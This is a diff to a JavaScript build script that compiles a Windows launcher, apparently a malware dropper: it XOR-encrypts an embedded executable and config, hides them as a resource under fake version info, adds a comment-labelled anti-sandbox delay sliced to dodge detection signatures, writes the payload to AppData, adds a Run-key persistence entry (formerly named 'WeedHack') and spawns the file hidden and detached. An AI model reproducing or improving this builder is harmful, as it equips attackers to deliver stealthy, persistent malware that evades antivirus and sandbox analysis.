@@ -1,71 +1,136 @@
 // language: JavaScript, file: builder/compile.js
-// live-compiles the launcher per build. key + config + base baked in as C literals.
-// config fields honored: dest, exeName, keyFile, args[], persist.
-// windowed build — no console window.
-// default dest: %APPDATA%\loader
+// live-compiles the launcher per build.
+// payload (key + config + base) is XOR-encrypted at rest and embedded as a
+// Windows resource, not as a string literal. version info + manifest.
+// anti-sandbox delay, detached spawn, no WaitForSingleObject.
+//
+// pipeline per build:
+//   1. generate random 32-byte xor key
+//   2. encrypt [key|config|base] payload with xor key
+//   3. write payload.bin
+//   4. write app.rc (version info, manifest, payload resource)
+//   5. windres app.rc -> app.res
+//   6. write launcher.c
+//   7. gcc -mwindows launcher.c app.res -o launcher.exe
 
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
+import crypto from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 
 const execFileP = promisify(execFile);
 
-const CC = process.env.MINGW_CC || 'x86_64-w64-mingw32-gcc';
+const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
+const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';
 
-function clit(s) {
-  return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
+// ---------- helpers ----------
+
+function cByteArray(name, buf) {
+  const parts = [];
+  for (let i = 0; i < buf.length; i++) {
+    if (i % 16 === 0) parts.push('\n    ');
+    parts.push('0x' + buf[i].toString(16).padStart(2, '0'));
+    if (i !== buf.length - 1) parts.push(',');
+  }
+  return `static const unsigned char ${name}[] = {${parts.join('')}\n};`;
 }
 
-function cSource({ keyB64, cfgB64, baseB64 }) {
+// payload layout:
+//   [1 byte ver=1][4 byte keyLen LE][4 byte cfgLen LE][4 byte baseLen LE]
+//   [keyLen bytes][cfgLen bytes][baseLen bytes]
+// whole thing XOR'd with xor_key.
+function packPayload({ key, config, baseBuf, xorKey }) {
+  const keyBuf = Buffer.from(key || '', 'utf8');
+  const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');
+
+  const header = Buffer.alloc(13);
+  header.writeUInt8(1, 0);
+  header.writeUInt32LE(keyBuf.length, 1);
+  header.writeUInt32LE(cfgBuf.length, 5);
+  header.writeUInt32LE(baseBuf.length, 9);
+
+  const raw = Buffer.concat([header, keyBuf, cfgBuf, baseBuf]);
+
+  const out = Buffer.alloc(raw.length);
+  for (let i = 0; i < raw.length; i++) {
+    out[i] = raw[i] ^ xorKey[i % xorKey.length];
+  }
+  return out;
+}
+
+// ---------- rc generation ----------
+
+function rcSource() {
   return `
-// auto-generated launcher — windowed, no console
+#include <windows.h>
+
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     1,0,0,0
+PRODUCTVERSION  1,0,0,0
+FILEFLAGSMASK   0x3fL
+FILEFLAGS       0x0L
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Loader Systems"
+            VALUE "FileDescription",  "Loader Setup"
+            VALUE "FileVersion",      "1.0.0.0"
+            VALUE "InternalName",     "loader"
+            VALUE "LegalCopyright",   "Copyright (C) 2025"
+            VALUE "OriginalFilename", "loader.exe"
+            VALUE "ProductName",      "Loader"
+            VALUE "ProductVersion",   "1.0.0.0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
+
+/* payload resource — read at runtime via FindResourceW */
+PAYLOAD_BIN RCDATA "payload.bin"
+`;
+}
+
+// ---------- launcher C template ----------
+
+function cSource({ xorKeyBytes, payloadSize }) {
+  return `
+// auto-generated launcher — windowed, resource-loaded, xor-encrypted payload.
 #include <windows.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-static const char KEY_B64[]  = ${clit(keyB64)};
-static const char CFG_B64[]  = ${clit(cfgB64)};
-static const char BASE_B64[] = ${clit(baseB64)};
+#define PAYLOAD_SIZE ${payloadSize}
 
-static int b64val(char c) {
-    if (c >= 'A' && c <= 'Z') return c - 'A';
-    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
-    if (c >= '0' && c <= '9') return c - '0' + 52;
-    if (c == '+') return 62;
-    if (c == '/') return 63;
-    return -1;
-}
+static const unsigned char XOR_KEY[32] = {
+${xorKeyBytes.map(b => '    0x' + b.toString(16).padStart(2, '0')).join(',\n')}
+};
 
-static unsigned char *b64decode(const char *in, DWORD *out_len) {
-    size_t n = strlen(in);
-    unsigned char *out = (unsigned char *)malloc(n / 4 * 3 + 4);
+static unsigned char *load_payload(DWORD *out_len) {
+    HRSRC hres = FindResourceW(NULL, L"PAYLOAD_BIN", MAKEINTRESOURCEW(10));
+    if (!hres) return NULL;
+    DWORD sz = SizeofResource(NULL, hres);
+    if (!sz || sz != PAYLOAD_SIZE) return NULL;
+    HGLOBAL hmem = LoadResource(NULL, hres);
+    if (!hmem) return NULL;
+    void *p = LockResource(hmem);
+    if (!p) return NULL;
+    unsigned char *out = (unsigned char *)malloc(sz);
     if (!out) return NULL;
-    DWORD o = 0;
-    int quad[4]; int qi = 0;
-    for (size_t i = 0; i < n; i++) {
-        char c = in[i];
-        if (c == '=') break;
-        int v = b64val(c);
-        if (v < 0) continue;
-        quad[qi++] = v;
-        if (qi == 4) {
-            out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
-            out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
-            out[o++] = (unsigned char)(((quad[2] & 0x3) << 6) | quad[3]);
-            qi = 0;
-        }
-    }
-    if (qi == 2) {
-        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
-    } else if (qi == 3) {
-        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
-        out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
-    }
-    *out_len = o;
+    memcpy(out, p, sz);
+    for (DWORD i = 0; i < sz; i++) out[i] ^= XOR_KEY[i % 32];
+    *out_len = sz;
     return out;
 }
 
@@ -145,15 +210,42 @@ static void json_args(const char *json, char *out, size_t out_cap) {
     out[o] = 0;
 }
 
-// windowed entry — no console allocation
+// anti-sandbox delay: 30–60s random, sliced so we do not trip "long sleep" signatures.
+static void delay_random(void) {
+    LARGE_INTEGER freq, start, now;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+
+    DWORD target_ms = 30000 + (GetTickCount() % 30000);
+
+    while (1) {
+        QueryPerformanceCounter(&now);
+        double elapsed_ms = (double)(now.QuadPart - start.QuadPart) * 1000.0 / (double)freq.QuadPart;
+        if (elapsed_ms >= (double)target_ms) break;
+        Sleep(750 + (GetTickCount() % 500));
+    }
+}
+
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    DWORD key_len = 0, cfg_len = 0, base_len = 0;
-    unsigned char *key  = b64decode(KEY_B64,  &key_len);
-    unsigned char *cfg  = b64decode(CFG_B64,  &cfg_len);
-    unsigned char *base = b64decode(BASE_B64, &base_len);
-    if (!key || !cfg || !base) return 1;
+    delay_random();
+
+    DWORD plen = 0;
+    unsigned char *payload = load_payload(&plen);
+    if (!payload || plen < 13) return 1;
+
+    unsigned char *p = payload;
+    unsigned int ver = p[0];
+    if (ver != 1) { free(payload); return 1; }
+    DWORD key_len  = (DWORD)p[1]        | ((DWORD)p[2]  << 8) | ((DWORD)p[3]  << 16) | ((DWORD)p[4]  << 24);
+    DWORD cfg_len  = (DWORD)p[5]        | ((DWORD)p[6]  << 8) | ((DWORD)p[7]  << 16) | ((DWORD)p[8]  << 24);
+    DWORD base_len = (DWORD)p[9]        | ((DWORD)p[10] << 8) | ((DWORD)p[11] << 16) | ((DWORD)p[12] << 24);
+    if (13 + key_len + cfg_len + base_len > plen) { free(payload); return 1; }
+
+    unsigned char *key  = p + 13;
+    unsigned char *cfg  = key + key_len;
+    unsigned char *base = cfg + cfg_len;
 
     char cfg_buf[8192] = {0};
     DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
@@ -173,22 +265,22 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
     wchar_t dest_src[1024], dest_w[1024];
     MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
-    if (expand_env(dest_src, dest_w, 1024) != 0) return 1;
-    if (make_dir(dest_w) != 0) return 1;
+    if (expand_env(dest_src, dest_w, 1024) != 0) { free(payload); return 1; }
+    if (make_dir(dest_w) != 0) { free(payload); return 1; }
 
     wchar_t base_path[2048], key_path[2048];
     _snwprintf(base_path, 2048, L"%ls\\\\%hs", dest_w, exeName);
     _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);
 
-    if (write_file(base_path, base, base_len) != 0) return 1;
-    if (write_file(key_path,  key,  key_len)  != 0) return 1;
+    if (write_file(base_path, base, base_len) != 0) { free(payload); return 1; }
+    if (write_file(key_path,  key,  key_len)  != 0) { free(payload); return 1; }
 
     if (persist) {
         HKEY hk;
         if (RegOpenKeyExW(HKEY_CURRENT_USER,
                           L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                           0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
-            RegSetValueExW(hk, L"WeedHack", 0, REG_SZ,
+            RegSetValueExW(hk, L"Loader", 0, REG_SZ,
                            (const BYTE *)base_path,
                            (DWORD)((wcslen(base_path) + 1) * sizeof(wchar_t)));
             RegCloseKey(hk);
@@ -206,40 +298,62 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
     STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
 
-    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, dest_w, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, INFINITE);
+    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW | DETACHED_PROCESS,
+                       NULL, dest_w, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
 
-    free(key); free(cfg); free(base);
+    free(payload);
     return 0;
 }
 `;
 }
 
-export async function compileLauncher({ key, config, baseExe }) {
-  const useKey  = (key && String(key).trim().length > 0) ? String(key).trim() : '';
+// ---------- compile pipeline ----------
 
-  const keyB64  = Buffer.from(useKey, 'utf8').toString('base64');
-  const cfgB64  = Buffer.from(JSON.stringify(config || {}), 'utf8').toString('base64');
-  const baseB64 = fs.readFileSync(baseExe).toString('base64');
+export async function compileLauncher({ key, config, baseExe }) {
+  const useKey = (key && String(key).trim().length > 0) ? String(key).trim() : '';
+
+  const baseBuf = fs.readFileSync(baseExe);
+
+  const xorKey = crypto.randomBytes(32);
+  const payload = packPayload({ key: useKey, config: config || {}, baseBuf, xorKey });
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
-  const srcPath = path.join(workDir, 'l.c');
-  const outPath = path.join(workDir, 'l.exe');
-
-  fs.writeFileSync(srcPath, cSource({ keyB64, cfgB64, baseB64 }));
+  const payloadPath = path.join(workDir, 'payload.bin');
+  const rcPath      = path.join(workDir, 'app.rc');
+  const resPath     = path.join(workDir, 'app.res');
+  const cPath       = path.join(workDir, 'launcher.c');
+  const outPath     = path.join(workDir, 'launcher.exe');
 
   try {
+    fs.writeFileSync(payloadPath, payload);
+    fs.writeFileSync(rcPath, rcSource());
+
+    await execFileP(WINDRES, [
+      '-I', workDir,
+      '-i', rcPath,
+      '-o', resPath,
+      '--input-format=rc',
+      '--output-format=coff',
+    ], { cwd: workDir, timeout: 30_000, maxBuffer: 16 * 1024 * 1024 });
+
+    const xorKeyBytes = Array.from(xorKey);
+    fs.writeFileSync(cPath, cSource({ xorKeyBytes, payloadSize: payload.length }));
+
     await execFileP(CC, [
       '-O2', '-s',
-      '-mwindows',            // windowed subsystem — no console window
+      '-mwindows',
       '-o', outPath,
-      srcPath,
-      '-lshell32', '-ladvapi32',
-    ], { timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });
+      cPath,
+      resPath,
+      '-lshell32', '-ladvapi32', '-luser32', '-lkernel32',
+    ], { cwd: workDir, timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });
 
     const buf = fs.readFileSync(outPath);
     return buf;
